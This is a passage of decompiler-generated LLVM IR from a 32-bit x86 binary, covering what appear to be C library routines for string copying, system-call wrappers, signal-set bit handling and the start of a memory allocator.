  %v2_805028f = phi i32 [ %v7_805028f, %dec_label_pc_805028e.dec_label_pc_805028e_crit_edge ], [ %v4_805028a, %dec_label_pc_8050281 ]
  %v8_805028e = phi i1 [ %v5_805028f, %dec_label_pc_805028e.dec_label_pc_805028e_crit_edge ], [ %v8_805028e.pre, %dec_label_pc_8050281 ]
  %v4_805028e = phi i32 [ %v0_8050290, %dec_label_pc_805028e.dec_label_pc_805028e_crit_edge ], [ %v4_805028e.pre, %dec_label_pc_8050281 ]
  %v7_805028e = phi i32 [ %v0_805028e.pre, %dec_label_pc_805028e.dec_label_pc_805028e_crit_edge ], [ %arg2, %dec_label_pc_8050281 ]
  %v1_805028e = inttoptr i32 %v7_805028e to i8*
  %v2_805028e = load i8, i8* %v1_805028e, align 1
  %v3_805028e = zext i8 %v2_805028e to i32
  %v5_805028e = and i32 %v4_805028e, -256
  %v6_805028e = or i32 %v3_805028e, %v5_805028e
  store i32 %v6_805028e, i32* %eax.global-to-local, align 4
  %v9_805028e = select i1 %v8_805028e, i32 -1, i32 1
  %v10_805028e = add i32 %v7_805028e, %v9_805028e
  store i32 %v10_805028e, i32* %esi.global-to-local, align 4
  %v3_805028f = inttoptr i32 %v2_805028f to i8*
  store i8 %v2_805028e, i8* %v3_805028f, align 1
  %v4_805028f = load i32, i32* %edi.global-to-local, align 4
  %v5_805028f = load i1, i1* @df, align 1
  %v6_805028f = select i1 %v5_805028f, i32 -1, i32 1
  %v7_805028f = add i32 %v6_805028f, %v4_805028f
  store i32 %v7_805028f, i32* %edi.global-to-local, align 4
  %v0_8050290 = load i32, i32* %eax.global-to-local, align 4
  %v3_8050290 = trunc i32 %v0_8050290 to i8
  %v4_8050290 = icmp eq i8 %v3_8050290, 0
  %v1_8050292 = icmp eq i1 %v4_8050290, false
  br i1 %v1_8050292, label %dec_label_pc_805028e.dec_label_pc_805028e_crit_edge, label %dec_label_pc_8050294

dec_label_pc_805028e.dec_label_pc_805028e_crit_edge: ; preds = %dec_label_pc_805028e
  %v0_805028e.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805028e

dec_label_pc_8050294:                             ; preds = %dec_label_pc_805028e
  store i32 %v4_805028a, i32* %eax.global-to-local, align 4
  %v2_8050299 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8050299, i32* %esi.global-to-local, align 4
  ret i32 %v4_805028a

; uselistorder directives
  uselistorder i32 %v0_8050290, { 1, 0 }
  uselistorder i32 %v7_805028f, { 1, 0 }
  uselistorder i1 %v5_805028f, { 1, 0 }
  uselistorder i32 %v4_805028a, { 1, 2, 0, 3 }
}

define i32 @function_805029c() local_unnamed_addr {
dec_label_pc_805029c:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v2_805029f = ptrtoint i32* %stack_var_-4 to i32
  %v2_80502a8 = inttoptr i32 %tmp to i8*
  %v3_80502a8 = call i32 @function_805248d(i8* %v2_80502a8, i32 %v2_805029f)
  %v1_80502b3 = icmp eq i32 %v3_80502a8, 0
  br i1 %v1_80502b3, label %dec_label_pc_80502bb, label %dec_label_pc_80502b7

dec_label_pc_80502b7:                             ; preds = %dec_label_pc_805029c
  %v3_80502b7 = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80502bb

dec_label_pc_80502bb:                             ; preds = %dec_label_pc_805029c, %dec_label_pc_80502b7
  %v0_80502bb = phi i32 [ -1, %dec_label_pc_805029c ], [ %v3_80502b7, %dec_label_pc_80502b7 ]
  ret i32 %v0_80502bb

; uselistorder directives
  uselistorder label %dec_label_pc_80502bb, { 1, 0 }
}

define i32 @function_80502c1(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_80502c1:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_80502dc = ptrtoint i32* %stack_var_-12 to i32
  %v2_80502e3 = call i32 @function_8051ed7(i32 5, i32 %v2_80502dc)
  ret i32 %v2_80502e3

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @function_80502ec(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_80502ec:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_8050307 = ptrtoint i32* %stack_var_-12 to i32
  %v2_805030e = call i32 @function_8051ed7(i32 2, i32 %v2_8050307)
  ret i32 %v2_805030e

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @function_8050317(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8050317:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_8050332 = ptrtoint i32* %stack_var_-12 to i32
  %v2_8050339 = call i32 @function_8051ed7(i32 3, i32 %v2_8050332)
  ret i32 %v2_8050339

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @function_8050342(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8050342:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_805035d = ptrtoint i32* %stack_var_-12 to i32
  %v2_8050364 = call i32 @function_8051ed7(i32 6, i32 %v2_805035d)
  ret i32 %v2_8050364

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @function_805036d() local_unnamed_addr {
dec_label_pc_805036d:
  %stack_var_-20 = alloca i32, align 4
  %v2_8050398 = ptrtoint i32* %stack_var_-20 to i32
  %v2_805039f = call i32 @function_8051ed7(i32 15, i32 %v2_8050398)
  ret i32 %v2_805039f
}

define i32 @function_80503a8(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_80503a8:
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-8, align 4
  %v2_80503bb = ptrtoint i32* %stack_var_-8 to i32
  %v2_80503c2 = call i32 @function_8051ed7(i32 4, i32 %v2_80503bb)
  ret i32 %v2_80503c2

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @function_80503cb() local_unnamed_addr {
dec_label_pc_80503cb:
  %stack_var_-16 = alloca i32, align 4
  %v2_80503ee = ptrtoint i32* %stack_var_-16 to i32
  %v2_80503f5 = call i32 @function_8051ed7(i32 10, i32 %v2_80503ee)
  ret i32 %v2_80503f5
}

define i32 @function_80503fe() local_unnamed_addr {
dec_label_pc_80503fe:
  %stack_var_-24 = alloca i32, align 4
  %v2_8050431 = ptrtoint i32* %stack_var_-24 to i32
  %v2_8050438 = call i32 @function_8051ed7(i32 12, i32 %v2_8050431)
  ret i32 %v2_8050438
}

define i32 @function_8050441() local_unnamed_addr {
dec_label_pc_8050441:
  %stack_var_-16 = alloca i32, align 4
  %v2_8050464 = ptrtoint i32* %stack_var_-16 to i32
  %v2_805046b = call i32 @function_8051ed7(i32 9, i32 %v2_8050464)
  ret i32 %v2_805046b
}

define i32 @function_8050474() local_unnamed_addr {
dec_label_pc_8050474:
  %stack_var_-24 = alloca i32, align 4
  %v2_80504a7 = ptrtoint i32* %stack_var_-24 to i32
  %v2_80504ae = call i32 @function_8051ed7(i32 11, i32 %v2_80504a7)
  ret i32 %v2_80504ae
}

define i32 @function_80504b7(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_80504b7:
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-20, align 4
  %v2_80504e2 = ptrtoint i32* %stack_var_-20 to i32
  %v2_80504e9 = call i32 @function_8051ed7(i32 14, i32 %v2_80504e2)
  ret i32 %v2_80504e9

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @function_80504f2(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80504f2:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_805050d = ptrtoint i32* %stack_var_-12 to i32
  %v2_8050514 = call i32 @function_8051ed7(i32 1, i32 %v2_805050d)
  ret i32 %v2_8050514

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32 (i32, i32)* @function_8051ed7, { 5, 11, 4, 6, 3, 2, 10, 1, 7, 0, 9, 8 }
}

define i32 @function_805051d(i32 %arg1) local_unnamed_addr {
dec_label_pc_805051d:
  %tmp3 = icmp slt i32 %arg1, 1
  br i1 %tmp3, label %dec_label_pc_8050535, label %dec_label_pc_8050528

dec_label_pc_8050528:                             ; preds = %dec_label_pc_805051d
  %v1_8050528 = add i32 %arg1, -64
  %v3_8050528 = sub i32 63, %arg1
  %v4_8050528 = and i32 %v3_8050528, %arg1
  %v5_8050528 = icmp slt i32 %v4_8050528, 0
  %v6_8050528 = icmp eq i32 %v1_8050528, 0
  %v7_8050528 = icmp slt i32 %v1_8050528, 0
  %v3_805052b = icmp eq i1 %v7_8050528, %v5_8050528
  %v4_805052b = icmp eq i1 %v6_8050528, false
  %v5_805052b = and i1 %v4_805052b, %v3_805052b
  br i1 %v5_805052b, label %dec_label_pc_8050535, label %dec_label_pc_805052d

dec_label_pc_805052d:                             ; preds = %dec_label_pc_8050528
  %v4_8050530 = call i32 @function_8050633(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_8050535

dec_label_pc_8050535:                             ; preds = %dec_label_pc_8050528, %dec_label_pc_805051d, %dec_label_pc_805052d
  %v1_8050535 = call i32 @function_805021b(i32 ptrtoint (i32* @0 to i32))
  %v1_805053a = inttoptr i32 %v1_8050535 to i32*
  store i32 22, i32* %v1_805053a, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v1_8050528, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_8050535, { 2, 0, 1 }
}

define i32 @function_8050547(i32 %arg1) local_unnamed_addr {
dec_label_pc_8050547:
  %v3_8050555 = inttoptr i32 %arg1 to i8*
  %v4_8050555 = call i32 @function_805026c(i8* %v3_8050555, i32 0, i32 128)
  ret i32 0
}

define i32 @function_8050560(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8050560:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-300 = alloca i32, align 4
  %v0_8050560 = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v10_8050575 = icmp eq i32 %arg2, -1
  %arg1.off = add i32 %arg1, -1
  %tmp35 = icmp ugt i32 %arg1.off, 63
  %tmp36 = or i1 %tmp35, %v10_8050575
  br i1 %tmp36, label %dec_label_pc_8050583, label %dec_label_pc_805059e.lr.ph

dec_label_pc_8050583:                             ; preds = %dec_label_pc_8050560
  %v1_8050583 = call i32 @function_805021b(i32 %v0_8050560)
  store i32 %v1_8050583, i32* %eax.global-to-local, align 4
  %v1_8050588 = inttoptr i32 %v1_8050583 to i32*
  store i32 22, i32* %v1_8050588, align 4
  br label %dec_label_pc_8050607

dec_label_pc_805059e.lr.ph:                       ; preds = %dec_label_pc_8050560
  %v15_8050561 = ptrtoint i32* %stack_var_-300 to i32
  store i32 %arg2, i32* %stack_var_-144, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  %v4_805059e28 = add i32 %v15_8050561, 284
  %v5_805059e29 = inttoptr i32 %v4_805059e28 to i32*
  store i32 0, i32* %v5_805059e29, align 4
  %v0_80505a930 = load i32, i32* %eax.global-to-local, align 4
  %v1_80505a931 = add i32 %v0_80505a930, -1
  %v9_80505a932 = icmp slt i32 %v1_80505a931, 0
  store i32 %v1_80505a931, i32* %eax.global-to-local, align 4
  %v1_80505aa33 = icmp eq i1 %v9_80505a932, false
  br i1 %v1_80505aa33, label %dec_label_pc_805059e.dec_label_pc_805059e_crit_edge, label %dec_label_pc_80505ac

dec_label_pc_805059e.dec_label_pc_805059e_crit_edge: ; preds = %dec_label_pc_805059e.lr.ph, %dec_label_pc_805059e.dec_label_pc_805059e_crit_edge
  %v1_80505a934 = phi i32 [ %v1_80505a9, %dec_label_pc_805059e.dec_label_pc_805059e_crit_edge ], [ %v1_80505a931, %dec_label_pc_805059e.lr.ph ]
  %v0_805059e.pre = load i32, i32* @esp, align 4
  %v2_805059e = mul i32 %v1_80505a934, 4
  %v3_805059e = add i32 %v0_805059e.pre, 160
  %v4_805059e = add i32 %v3_805059e, %v2_805059e
  %v5_805059e = inttoptr i32 %v4_805059e to i32*
  store i32 0, i32* %v5_805059e, align 4
  %v0_80505a9 = load i32, i32* %eax.global-to-local, align 4
  %v1_80505a9 = add i32 %v0_80505a9, -1
  %v9_80505a9 = icmp slt i32 %v1_80505a9, 0
  store i32 %v1_80505a9, i32* %eax.global-to-local, align 4
  %v1_80505aa = icmp eq i1 %v9_80505a9, false
  br i1 %v1_80505aa, label %dec_label_pc_805059e.dec_label_pc_805059e_crit_edge, label %dec_label_pc_80505ac

dec_label_pc_80505ac:                             ; preds = %dec_label_pc_805059e.dec_label_pc_805059e_crit_edge, %dec_label_pc_805059e.lr.ph
  %v0_80505ac = load i32, i32* @edx, align 4
  %v2_80505af = ptrtoint i32* %stack_var_-140 to i32
  store i32 %v2_80505af, i32* %eax.global-to-local, align 4
  %v4_80505b7 = call i32 @function_8050633(i32 %v2_80505af, i32 %arg1, i32 %v0_80505ac, i32 %v0_80505ac)
  store i32 %v4_80505b7, i32* %eax.global-to-local, align 4
  %v2_80505bf = icmp slt i32 %v4_80505b7, 0
  br i1 %v2_80505bf, label %dec_label_pc_8050607, label %dec_label_pc_80505c3

dec_label_pc_80505c3:                             ; preds = %dec_label_pc_80505ac
  %v4_80505cb = call i32 @function_805060f(i32 ptrtoint (i32* @global_var_80532c0.30 to i32), i32 %arg1, i32 %v4_80505b7, i32 %v4_80505b7)
  %v2_80505e4 = ptrtoint i32* %stack_var_-284 to i32
  %v2_80505e9 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_80505e9, i32* %eax.global-to-local, align 4
  %v4_80505f2 = call i32 @function_8051de3(i32 %arg1, i32* nonnull %stack_var_-144, i32 %v2_80505e4)
  store i32 %v4_80505f2, i32* %eax.global-to-local, align 4
  %v2_80505fa = icmp slt i32 %v4_80505f2, 0
  %v3_80505fe = load i32, i32* %stack_var_-284, align 4
  %.v3_80505fe = select i1 %v2_80505fa, i32 -1, i32 %v3_80505fe
  br label %dec_label_pc_8050607

dec_label_pc_8050607:                             ; preds = %dec_label_pc_80505c3, %dec_label_pc_8050583, %dec_label_pc_80505ac
  %storemerge = phi i32 [ -1, %dec_label_pc_80505ac ], [ -1, %dec_label_pc_8050583 ], [ %.v3_80505fe, %dec_label_pc_80505c3 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_80505a9, { 2, 1, 0 }
  uselistorder i32* %stack_var_-144, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 9, 1, 2, 3, 4, 6, 5, 0, 10, 11, 7, 8 }
  uselistorder i32 284, { 0, 4, 5, 6, 7, 8, 1, 2, 3, 9 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 3, 2, 1, 0, 4 }
  uselistorder label %dec_label_pc_8050607, { 0, 2, 1 }
  uselistorder label %dec_label_pc_805059e.dec_label_pc_805059e_crit_edge, { 1, 0 }
}

define i32 @function_805060f(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_805060f:
  %v1_805061d = add i32 %arg2, -1
  %v1_8050620 = urem i32 %v1_805061d, 32
  %v2_8050620 = icmp eq i32 %v1_8050620, 0
  %v2_8050623 = udiv i32 %v1_805061d, 32
  br i1 %v2_8050620, label %bb5, label %bb

bb:                                               ; preds = %dec_label_pc_805060f
  %v5_8050626 = shl i32 1, %v1_8050620
  br label %bb5

bb5:                                              ; preds = %dec_label_pc_805060f, %bb
  %v6_8050628 = phi i32 [ 1, %dec_label_pc_805060f ], [ %v5_8050626, %bb ]
  %v2_8050628 = mul nuw nsw i32 %v2_8050623, 4
  %v3_8050628 = add i32 %v2_8050628, %arg1
  %v4_8050628 = inttoptr i32 %v3_8050628 to i32*
  %v5_8050628 = load i32, i32* %v4_8050628, align 4
  %v7_8050628 = and i32 %v5_8050628, %v6_8050628
  %v8_8050628 = icmp eq i32 %v7_8050628, 0
  %v1_805062c = icmp eq i1 %v8_8050628, false
  %v2_805062c = zext i1 %v1_805062c to i32
  ret i32 %v2_805062c

; uselistorder directives
  uselistorder i32 %v1_8050620, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @function_8050633(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8050633:
  %stack_var_-4 = alloca i32, align 4
  %v0_8050633 = load i32, i32* @ebx, align 4
  store i32 %v0_8050633, i32* %stack_var_-4, align 4
  %v1_8050641 = add i32 %arg2, -1
  %v1_8050644 = urem i32 %v1_8050641, 32
  %v2_8050644 = icmp eq i32 %v1_8050644, 0
  store i32 %v1_8050644, i32* @ecx, align 4
  %v2_8050647 = udiv i32 %v1_8050641, 32
  store i32 %v2_8050647, i32* @edx, align 4
  br i1 %v2_8050644, label %bb5, label %bb

bb:                                               ; preds = %dec_label_pc_8050633
  %v5_805064a = shl i32 1, %v1_8050644
  br label %bb5

bb5:                                              ; preds = %dec_label_pc_8050633, %bb
  %v6_805064c = phi i32 [ 1, %dec_label_pc_8050633 ], [ %v5_805064a, %bb ]
  %v2_805064c = mul nuw nsw i32 %v2_8050647, 4
  %v3_805064c = add i32 %v2_805064c, %arg1
  %v4_805064c = inttoptr i32 %v3_805064c to i32*
  %v5_805064c = load i32, i32* %v4_805064c, align 4
  %v7_805064c = or i32 %v5_805064c, %v6_805064c
  store i32 %v7_805064c, i32* %v4_805064c, align 4
  %v2_8050651 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8050651, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_8050647, { 1, 0 }
  uselistorder i32 %v1_8050644, { 2, 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @function_8050653() local_unnamed_addr {
dec_label_pc_8050653:
  %v0_8050653 = load i32, i32* @eax, align 4
  %v6_8050666 = icmp ugt i32 %v0_8050653, 16777215
  br i1 %v6_8050666, label %dec_label_pc_8050677, label %dec_label_pc_8050668

dec_label_pc_8050668:                             ; preds = %dec_label_pc_8050653
  %v2_8050656 = udiv i32 %v0_8050653, 256
  %tmp = icmp ult i32 %v0_8050653, 256
  %v2_8050668 = call i32 @llvm.ctlz.i32(i32 %v2_8050656, i1 true)
  %v3_8050668 = xor i32 %v2_8050668, 31
  %v5_8050668 = select i1 %tmp, i32 95, i32 %v3_8050668
  %v1_805066b = add nuw nsw i32 %v5_8050668, 6
  %v2_805066e = urem i32 %v1_805066b, 32
  %v4_805066e = icmp eq i32 %v2_805066e, 0
  br i1 %v4_805066e, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_8050668
  %v5_805066e = lshr i32 %v0_8050653, %v2_805066e
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_8050668, %bb
  %v0_8050670 = phi i32 [ %v0_8050653, %dec_label_pc_8050668 ], [ %v5_805066e, %bb ]
  %v1_8050670 = urem i32 %v0_8050670, 4
  %v2_8050673 = mul nuw nsw i32 %v5_8050668, 4
  %v3_8050673 = or i32 %v1_8050670, 32
  %v4_8050673 = add nuw nsw i32 %v3_8050673, %v2_8050673
  br label %dec_label_pc_8050677

dec_label_pc_8050677:                             ; preds = %dec_label_pc_8050653, %bb4
  %v0_8050678 = phi i32 [ 95, %dec_label_pc_8050653 ], [ %v4_8050673, %bb4 ]
  ret i32 %v0_8050678

; uselistorder directives
  uselistorder i32 %v2_805066e, { 1, 0 }
  uselistorder i32 %v0_8050653, { 2, 3, 0, 1, 4 }
  uselistorder label %dec_label_pc_8050677, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @function_8050679(i32 %arg1) local_unnamed_addr {
dec_label_pc_8050679:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8050679 = load i32, i32* @ebp, align 4
  %v0_805067a = load i32, i32* @edi, align 4
  %v0_805067b = load i32, i32* @esi, align 4
  %v0_805067c = load i32, i32* @ebx, align 4
  store i32 %v0_805067c, i32* %stack_var_-16, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_805068e = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_805068e, i32* @eax, align 4
  store i32 %v2_805068e, i32* %stack_var_-92, align 4
  %v2_8050693 = call i32 @function_8051ba5(i32 %v2_805068e, i32 134552482)
  store i32 %v2_8050693, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_805303c.31 to i32), i32* %stack_var_-92, align 4
  %v1_805069f = call i32 @function_8051ba2(i32 ptrtoint (i32* @global_var_805303c.31 to i32))
  store i32 %v1_805069f, i32* %eax.global-to-local, align 4
  %v0_80506a7 = load i32, i32* %ebx.global-to-local, align 4
  %tmp123 = icmp ult i32 %v0_80506a7, -32
  br i1 %tmp123, label %dec_label_pc_80506be, label %dec_label_pc_80506ac

dec_label_pc_80506ac:                             ; preds = %dec_label_pc_8050679
  %v0_80506ac = load i32, i32* %stack_var_-92, align 4
  %v1_80506ac = call i32 @function_805021b(i32 %v0_80506ac)
  store i32 %v1_80506ac, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_80506b3 = inttoptr i32 %v1_80506ac to i32*
  store i32 12, i32* %v1_80506b3, align 4
  br label %dec_label_pc_8050de3

dec_label_pc_80506be:                             ; preds = %dec_label_pc_8050679
  %v1_80506be = add i32 %v0_80506a7, 11
  %tmp124 = icmp ult i32 %v1_80506be, 16
  %v1_80506ce = and i32 %v1_80506be, -8
  %v1_80506be.v1_80506ce = select i1 %tmp124, i32 %v1_80506be, i32 %v1_80506ce
  %.v1_80506ce = select i1 %tmp124, i32 16, i32 %v1_80506ce
  store i32 %v1_80506be.v1_80506ce, i32* %eax.global-to-local, align 4
  %v0_80506d5 = load i8, i8* @global_var_8053340.32, align 1
  %v1_80506d5 = sext i8 %v0_80506d5 to i32
  store i32 %v1_80506d5, i32* @ebx, align 4
  %v3_80506db = urem i8 %v0_80506d5, 2
  %v4_80506db = icmp eq i8 %v3_80506db, 0
  %v1_80506de = icmp eq i1 %v4_80506db, false
  br i1 %v1_80506de, label %dec_label_pc_80506fd, label %dec_label_pc_80506e0

dec_label_pc_80506e0:                             ; preds = %dec_label_pc_80506be
  %v2_80506e0 = icmp eq i8 %v0_80506d5, 0
  %v1_80506e2 = icmp eq i1 %v2_80506e0, false
  br i1 %v1_80506e2, label %dec_label_pc_80509d8, label %dec_label_pc_80506e8

dec_label_pc_80506e8:                             ; preds = %dec_label_pc_80506e0
  store i32 ptrtoint (i8* @global_var_8053340.32 to i32), i32* %stack_var_-92, align 4
  %v2_80506f0 = call i32 @function_8051296(i32* bitcast (i8* @global_var_8053340.32 to i32*))
  store i32 %v2_80506f0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80509d8

dec_label_pc_80506fd:                             ; preds = %dec_label_pc_80506be
  %v11_80506fd = trunc i32 %.v1_80506ce to i8
  %v8_8050701 = icmp ugt i8 %v11_80506fd, %v0_80506d5
  br i1 %v8_8050701, label %dec_label_pc_805071e, label %dec_label_pc_8050703

dec_label_pc_8050703:                             ; preds = %dec_label_pc_80506fd
  %v2_8050707 = udiv i32 %.v1_80506ce, 2
  store i32 %v2_8050707, i32* %eax.global-to-local, align 4
  %v1_8050709 = add i32 %v2_8050707, ptrtoint (i8* @global_var_8053340.32 to i32)
  store i32 %v1_8050709, i32* %ecx.global-to-local, align 4
  %v1_805070f = add i32 %v2_8050707, add (i32 ptrtoint (i8* @global_var_8053340.32 to i32), i32 -4)
  %v2_805070f = inttoptr i32 %v1_805070f to i32*
  %v3_805070f = load i32, i32* %v2_805070f, align 4
  store i32 %v3_805070f, i32* @edx, align 4
  %v1_8050712 = icmp eq i32 %v3_805070f, 0
  br i1 %v1_8050712, label %dec_label_pc_805071e, label %dec_label_pc_8050716

dec_label_pc_8050716:                             ; preds = %dec_label_pc_8050703
  %v1_8050716 = add i32 %v3_805070f, 8
  %v2_8050716 = inttoptr i32 %v1_8050716 to i32*
  %v3_8050716 = load i32, i32* %v2_8050716, align 4
  store i32 %v3_8050716, i32* %eax.global-to-local, align 4
  store i32 %v3_8050716, i32* %v2_805070f, align 4
  br label %dec_label_pc_8050757

dec_label_pc_805071e:                             ; preds = %dec_label_pc_8050703, %dec_label_pc_80506fd
  %v8_805071e = icmp ult i32 %.v1_80506ce, 255
  %v6_8050726 = icmp ugt i32 %.v1_80506ce, 255
  store i32 %.v1_80506ce, i32* @eax, align 4
  br i1 %v6_8050726, label %dec_label_pc_805075f, label %dec_label_pc_8050728

dec_label_pc_8050728:                             ; preds = %dec_label_pc_805071e
  %v2_805072c = udiv i32 %.v1_80506ce, 8
  store i32 %v2_805072c, i32* %eax.global-to-local, align 4
  %v1_8050733 = mul nuw i32 %v2_805072c, 8
  %v2_8050733 = add i32 %v1_8050733, ptrtoint (i32* @global_var_805336c.33 to i32)
  store i32 %v2_8050733, i32* %ecx.global-to-local, align 4
  %v1_805073a = add i32 %v1_8050733, add (i32 ptrtoint (i32* @global_var_805336c.33 to i32), i32 12)
  %v2_805073a = inttoptr i32 %v1_805073a to i32*
  %v3_805073a = load i32, i32* %v2_805073a, align 4
  store i32 %v3_805073a, i32* @edx, align 4
  %v12_805073d = icmp eq i32 %v3_805073a, %v2_8050733
  br i1 %v12_805073d, label %dec_label_pc_805085b.preheader, label %dec_label_pc_8050745

dec_label_pc_8050745:                             ; preds = %dec_label_pc_8050728
  store i32 %.v1_80506ce, i32* %ebx.global-to-local, align 4
  %v1_8050749 = add i32 %v3_805073a, 12
  %v2_8050749 = inttoptr i32 %v1_8050749 to i32*
  %v3_8050749 = load i32, i32* %v2_8050749, align 4
  store i32 %v3_8050749, i32* %eax.global-to-local, align 4
  store i32 %v3_8050749, i32* %v2_805073a, align 4
  %v0_805074f = load i32, i32* @edx, align 4
  %v1_805074f = load i32, i32* %ebx.global-to-local, align 4
  %v2_805074f = add i32 %v0_805074f, 4
  %v3_805074f = add i32 %v2_805074f, %v1_805074f
  %v4_805074f = inttoptr i32 %v3_805074f to i32*
  %v5_805074f = load i32, i32* %v4_805074f, align 4
  %v6_805074f = or i32 %v5_805074f, 1
  store i32 %v6_805074f, i32* %v4_805074f, align 4
  %v0_8050754 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8050754 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050754 = add i32 %v1_8050754, 8
  %v3_8050754 = inttoptr i32 %v2_8050754 to i32*
  store i32 %v0_8050754, i32* %v3_8050754, align 4
  br label %dec_label_pc_8050757

dec_label_pc_8050757:                             ; preds = %dec_label_pc_8050af4, %dec_label_pc_8050b06, %dec_label_pc_8050716, %dec_label_pc_8050745
  %v0_8050757 = load i32, i32* @edx, align 4
  %v1_8050757 = add i32 %v0_8050757, 8
  store i32 %v1_8050757, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050dd2

dec_label_pc_805075f:                             ; preds = %dec_label_pc_805071e
  %v0_8050763 = call i32 @function_8050653()
  store i32 %v0_8050763, i32* %eax.global-to-local, align 4
  %v3_8050768 = and i8 %v0_80506d5, 2
  %v4_8050768 = icmp eq i8 %v3_8050768, 0
  %v6_8050768 = zext i8 %v3_8050768 to i32
  %v9_8050768 = and i32 %v1_80506d5, -256
  %v10_8050768 = or i32 %v9_8050768, %v6_8050768
  store i32 %v10_8050768, i32* @ebx, align 4
  br i1 %v4_8050768, label %dec_label_pc_805085b.preheader, label %dec_label_pc_8050775

dec_label_pc_8050775:                             ; preds = %dec_label_pc_805075f
  store i32 ptrtoint (i8* @global_var_8053340.32 to i32), i32* %stack_var_-92, align 4
  %v2_805077d = call i32 @function_8051296(i32* bitcast (i8* @global_var_8053340.32 to i32*))
  store i32 %v2_805077d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805085b.preheader

dec_label_pc_805085b.preheader:                   ; preds = %dec_label_pc_8050775, %dec_label_pc_8050728, %dec_label_pc_805075f
  %stack_var_-40.0.ph = phi i32 [ %v2_805072c, %dec_label_pc_8050728 ], [ %v0_8050763, %dec_label_pc_8050775 ], [ %v0_8050763, %dec_label_pc_805075f ]
  %v0_805085b9 = load i32, i32* @global_var_8053380.36, align 128
  store i32 %v0_805085b9, i32* @ebp, align 4
  %v9_805086115 = icmp eq i32 %v0_805085b9, 134558580
  %v1_805086717 = icmp eq i1 %v9_805086115, false
  br i1 %v1_805086717, label %dec_label_pc_805078a.lr.ph, label %dec_label_pc_805086d

dec_label_pc_805078a.lr.ph:                       ; preds = %dec_label_pc_805085b.preheader
  %v1_80507b1 = add i32 %.v1_80506ce, 16
  br label %dec_label_pc_805078a

